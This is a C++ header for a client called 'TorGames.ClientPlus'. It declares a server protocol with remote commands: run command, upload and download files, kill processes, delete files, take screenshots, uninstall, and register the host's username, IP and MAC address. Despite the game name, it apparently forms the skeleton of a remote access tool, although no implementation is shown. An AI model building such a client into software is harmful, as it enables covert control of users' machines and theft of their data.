// TorGames.ClientPlus - Protocol definitions and message handling
#pragma once

#include "common.h"

// Command types from server (matches server CommandType enum)
enum class CommandType {
    None = 0,
    Ping = 1,
    GetSystemInfo = 2,
    GetProcessList = 3,
    KillProcess = 4,
    RunCommand = 5,
    Download = 6,
    Upload = 7,
    ListDirectory = 8,
    DeleteFile = 9,
    GetLogs = 10,
    Shutdown = 11,
    Restart = 12,
    Uninstall = 13,
    Update = 14,
    Screenshot = 15,
    MessageBox = 16
};

// Incoming message from server
struct ServerMessage {
    std::string type;       // "accepted", "error", "command"
    std::string commandId;
    std::string commandType;
    std::string commandText;
    std::string error;
    int timeout;
};

class Protocol {
public:
    Protocol();
    ~Protocol();

    // Connection management
    bool Connect(const char* host, int port);
    void Disconnect();
    bool IsConnected() const;

    // High-level operations
    bool SendRegister(const char* clientType, const char* hardwareId,
        const char* machineName, const char* osVersion, const char* osArch,
        int cpuCount, long long totalMemory, const char* username,
        const char* clientVersion, const char* ipAddress, const char* macAddress);

    // Simplified registration with JSON system info
    bool SendRegister(const char* clientType, const char* hardwareId, const char* systemInfoJson);

    bool SendHeartbeat(long long uptimeSeconds, long long availMemory);
    // Simplified heartbeat (uses current uptime and available memory)
    bool SendHeartbeat();

    bool SendCommandResult(const char* commandId, bool success, int exitCode,
        const char* output, const char* error);
    // Simplified command response
    bool SendCommandResponse(const char* commandId, bool success, const char* result);

    // Receive message from server
    bool ReceiveMessage(ServerMessage& msg, int timeoutMs = 5000);

private:
    SOCKET m_socket;
    bool m_connected;
    CRITICAL_SECTION m_sendLock;

    bool SendJson(const char* json);
    bool SendRaw(const void* data, int len);
    bool RecvRaw(void* data, int len, int timeoutMs);
    std::string ReadJson(int timeoutMs);
};
